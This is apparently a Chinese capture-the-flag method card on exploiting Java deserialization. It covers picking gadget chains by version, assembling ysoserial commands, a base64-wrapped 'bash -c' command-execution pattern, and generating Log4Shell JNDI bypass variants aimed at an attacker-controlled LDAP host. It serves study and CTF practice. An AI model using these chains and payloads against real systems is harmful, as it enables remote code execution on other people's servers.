---
title: 方法卡 · Java 反序列化（魔数判链 / ysoserial 命令拼装 / JNDI 变体生成）
category: web
tags: [java, 反序列化, ysoserial, commons-collections, jndi, log4shell, gadget]
signals: [请求体 base64 解码后以 rO0AB 开头, 错误栈里出现 ObjectInputStream.readObject, 依赖有 commons-collections/beanutils, 题目给了 jar 或 pom.xml 能看版本, 输入被写进日志且能控制 UA, 报错出现 InvokerTransformer 或 TemplatesImpl]
difficulty: hard
source: kb/web/java-deserialization.md, kb/web/jndi-log4shell.md
tools: [ysoserial, java, marshalsec, python]
updated: 2026-11-03
---

# 方法卡 · Java 反序列化（魔数判链 / ysoserial 命令拼装 / JNDI 变体生成）

## 适用场景

- 请求体/base64 解码后以 `AC ED 00 05` 开头（Java 序列化魔数），或 base64 以 `rO0AB` 开头；
- 依赖里有 `commons-collections`、`commons-beanutils`、`fastjson`、`xstream`、`hessian`；
- 错误堆栈出现 `ObjectInputStream.readObject`、`InvokerTransformer`、`TemplatesImpl`；
- 题面给了 `.jar`、`pom.xml`、`Dockerfile`，能推断库版本与 JDK 版本；
- 变体：Java 应用把任何输入（用户名、UA、`X-Api-Version`）写进日志，且 `log4j-core` 在 2.0-beta9~2.14.1 → Log4Shell。

## 前置条件

- 能拿到 classpath 里的库与版本（`pom.xml`/jar 列表/报错栈），否则只能盲测链；
- 生成侧要 **JDK 8** 跑 ysoserial（JDK 11/17 会因 `IllegalAccess` 失败，常见做法是 docker `java:8-jdk`）；
- JDK 8u191+ 禁用 LDAP 远程 codebase，需 LDAP 本地工厂或 RMI + 本地 gadget；
- 本卡脚本**离线**：只做魔数与 base64 判定、ysoserial 命令行拼装、JNDI 变形生成，不发包、不执行 java。

## 步骤

1. **确认入口**：看请求体是否 `rO0AB`/`AC ED 00 05`；看是否存在 `ObjectInputStream.readObject`。
2. **确认版本**：`commons-collections` 3.1/3.2.1 → CC1 系；4.x → CC2/CC3/CC4；shiro 常用 `CommonsBeanutils1`。
3. **先探连通**：`URLDNS` + dnslog，能回连再上 RCE 链；用本卡 `--payload` 直接出命令行。
4. **命令编码**：无空格管道场景用 `bash -c {echo,BASE64}|{base64,-d}|bash`，本卡 `--encode-cmd` 一键生成。
5. **生成并发送**：ysoserial 输出重定向成 bin，再 `base64 -w0` 贴进接口；返回 500 且无 `ClassNotFoundException` 说明链对但命令或 gadget 需换。
6. **Log4Shell 分支**：`--log4j-variants --host H` 生成绕过变形，逐条打到 UA/Referer/参数，看 dnslog。

```powershell
# 判断一段输入是不是 Java 序列化流（base64 或原始 hex）
.\.venv\Scripts\python.exe kb/_methods/scripts/java_deser.py --identify rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ
# 拼 ysoserial 命令行（含 JDK8 docker 兜底写法）
.\.venv\Scripts\python.exe kb/_methods/scripts/java_deser.py --payload CommonsCollections6 --cmd 'cat /flag'
# 命令里带空格/管道时，生成无特殊字符的 base64 包装
.\.venv\Scripts\python.exe kb/_methods/scripts/java_deser.py --encode-cmd 'cat /flag'
# Log4Shell 变形
.\.venv\Scripts\python.exe kb/_methods/scripts/java_deser.py --log4j-variants --host 1.2.3.4:1389
```

## 脚本

脚本路径：`kb/_methods/scripts/java_deser.py`（纯标准库，离线）

- `identify(raw)`：识别 `AC ED 00 05` / base64 `rO0AB` / hex 三种形态，返回 `(kind, detail)`；
- `choose_chain(cc_version, jdk, libs)`：按 commons-collections 版本与 JDK 版本给出候选链顺序（CC1 在 8u71+ 失效 → 退 CC5/CC6）；
- `ysoserial_cmd(gadget, cmd, jar)`：拼 `java -jar ...` 与 docker 兜底两行命令；
- `wrap_cmd(cmd)`：生成 `bash -c {echo,B64}|{base64,-d}|bash` 形式；
- `log4j_variants(host, path)`：生成 `${jndi:...}` 的 6 种常见变形（lower/::-/env 兜底）；
- `--selftest`：固定断言 6 组，退出码 0 才算过。

## 失效场景

- **JDK 高版本 + CC3.x**：`AnnotationInvocationHandler` 已修补，CC1/CC3 直接失效，必须换 CC5/CC6/Beanutils 或 `TemplatesImpl`。
- **ysoserial 在 JDK 11/17 下生成**：一律报 `IllegalAccess`，必须用 JDK 8 容器。
- **不出网**：URLDNS/JNDI 全部无效，只能走 `TemplatesImpl` 写文件到静态目录再看回显。
- **chain 类不在 classpath**：报 `ClassNotFoundException`，需要按 pom 重新挑链（本卡 `--choose` 只是启发式建议）。
- **Log4j 2.15.0+**：默认禁用 JNDI，`--log4j-variants` 只在 2.0~2.14.1 有效。
- **过滤器/网关转义 `${`**：需 URL 编码成 `%24%7Bjndi:`，本卡只生成原样文本，编码需另做。

## 相关文档

- `kb/web/java-deserialization.md`（CC 链原理、ysoserial 用法、链探测顺序清单）
- `kb/web/jndi-log4shell.md`（Log4Shell 原理、WAF 变形、2.15 绕过）
